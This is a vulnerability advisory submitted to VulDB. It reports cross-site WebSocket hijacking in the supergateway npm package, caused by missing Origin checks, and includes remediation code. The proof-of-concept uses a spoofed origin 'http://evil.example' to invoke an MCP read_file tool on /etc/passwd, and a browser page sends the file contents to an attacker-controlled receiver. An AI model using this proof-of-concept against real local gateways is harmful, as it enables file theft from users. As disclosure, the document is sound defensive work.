# VulDB Submission - SGW-2026-002

**Submitter:** Teycir (@Teycir)
**Date:** 2026-11-17
**Research Repository:** https://github.com/Teycir/supergateway-security-research

## Vulnerability Information

**Title:** Cross-Site WebSocket Hijacking (CSWSH) via Missing Origin Validation in supergateway

**Vendor:** supercorp-ai
**Product:** supergateway (npm package)
**Affected Versions:** <= 4.2.2 (verified on commit 5ad19d3)
**Vulnerability Class:** Cross-Site WebSocket Hijacking (CWE-1385)
**Severity:** High (CVSS 3.1: 8.1)

## Description

The stdio→WebSocket gateway in supergateway accepts WebSocket upgrade requests from any origin without validation. WebSocket handshakes are not subject to the same-origin policy, and the server neither validates the `Origin` header nor requires authentication by default. Any web page a victim visits can therefore open a WebSocket connection to `ws://127.0.0.1:<port>/ws`, initialize an MCP session, and invoke tools (filesystem reads, shell operations, internal APIs) with the victim's privileges.

The server accepts arbitrary origins including `http://evil.example`, `null` (sandboxed/opaque origin), `https://attacker.test:4443`, and `http://localhost:9999`. With default settings, the gateway binds to all interfaces, so the attack also works cross-host when the port is reachable.

## Affected Component

- File: `src/gateways/stdioToWs.ts`
- Upgrade handling: No `Origin` header validation
- File: `src/lib/apiKey.ts`
- Authentication: Optional and not enabled by default

## Impact

- Full MCP tool execution under the victim's account/context from an arbitrary web origin
- Demonstrated: A page served from `http://127.0.0.1:8089` read a local file through a filesystem-style MCP tool
- 12/12 exfiltration runs across four different origins
- With default network binding, attack works cross-host when port is reachable
- Server accepts `Origin: null` (sandboxed origins)

## Proof of Concept

### Reproduction Steps

1. Clone the research repository: `git clone https://github.com/Teycir/supergateway-security-research`
2. Run bootstrap script: `./scripts/bootstrap.sh` (builds vulnerable supergateway v4.2.2)
3. Start receiver: `python3 pocs/receiver.py 8899 &`
4. Run exploit: `node pocs/cswsh_ws_poc.js ws://127.0.0.1:18081/ws evidence/canary.txt http://127.0.0.1:8899 http://evil.example`

### WebSocket Connection (Node.js)

```javascript
const WebSocket = require('ws');
const ws = new WebSocket('ws://127.0.0.1:18081/ws', {
  headers: { Origin: 'http://evil.example' }
});

ws.on('open', () => {
  // Initialize MCP session and invoke tools
  ws.send(JSON.stringify({
    jsonrpc: '2.0',
    id: 1,
    method: 'tools/call',
    params: { name: 'read_file', arguments: { path: '/etc/passwd' } }
  }));
});
```

### Browser Proof

Serve `pocs/cswsh_browser.html` from any origin and open it. The page will:
1. Connect to `ws://127.0.0.1:18081/ws` with malicious origin
2. Initialize MCP session
3. Invoke filesystem tools to read local files
4. Exfiltrate data to attacker-controlled server

### Expected Result

- WebSocket upgrade succeeds despite malicious origin
- MCP tools execute with victim's privileges
- Local file contents exfiltrated to attacker-controlled server

### Verification Status

- 12/12 exfiltration runs across four origins (http://evil.example, null, https://attacker.test:4443, http://localhost:9999)
- Real Chromium browser proof captured (see `evidence/cswsh_browser.png`)
- Raw WebSocket handshake logs available (see `evidence/cswsh_handshake.log`)

## Remediation

### Recommended Fix

1. Validate `Origin` header against an allowlist during WebSocket upgrade
2. Default allowlist: loopback origins only (`http://127.0.0.1:<port>`, `http://localhost:<port>`)
3. Reject `Origin: null` by default
4. Require authentication for WebSocket upgrades (reuse existing API-key check)
5. Bind to loopback by default and document exposure risks

### Example Fix

```typescript
// During upgrade handler:
const origin = req.headers.origin;
const allowedOrigins = [`http://127.0.0.1:${port}`, `http://localhost:${port}`];

if (!origin || !allowedOrigins.includes(origin)) {
  return res.status(403).send('Origin not allowed');
}

// Require authentication:
if (!apiKey) {
  return res.status(401).send('Authentication required');
}
```

### Workarounds

1. Enable `SUPERGATEWAY_API_KEY` environment variable (unauthenticated upgrades refused)
2. Bind to loopback only using firewall or network configuration
3. Use stdio→SSE mode instead (has different threat model)

## References

- Upstream Repository: https://github.com/supercorp-ai/supergateway
- Research Repository: https://github.com/Teycir/supergateway-security-research
- Full Advisory: https://github.com/Teycir/supergateway-security-research/blob/main/advisories/SGW-2026-002.md
- GitHub Issue: https://github.com/supercorp-ai/supergateway/issues/378
- GHSA (fork): https://github.com/Teycir/supergateway/security/advisories/GHSA-mw77-x7vj-mfcc

## Timeline

- 2026-11-17: Vulnerability discovered and reproduced
- 2026-11-17: 12/12 origin sweep verified; real-browser proof captured
- 2026-11-17: Research repository published
- 2026-11-17: Upstream issue #378 opened
- 2026-11-17: VulDB submission (this document)

## Credits

Research, exploit development, and report: Teycir (@Teycir)
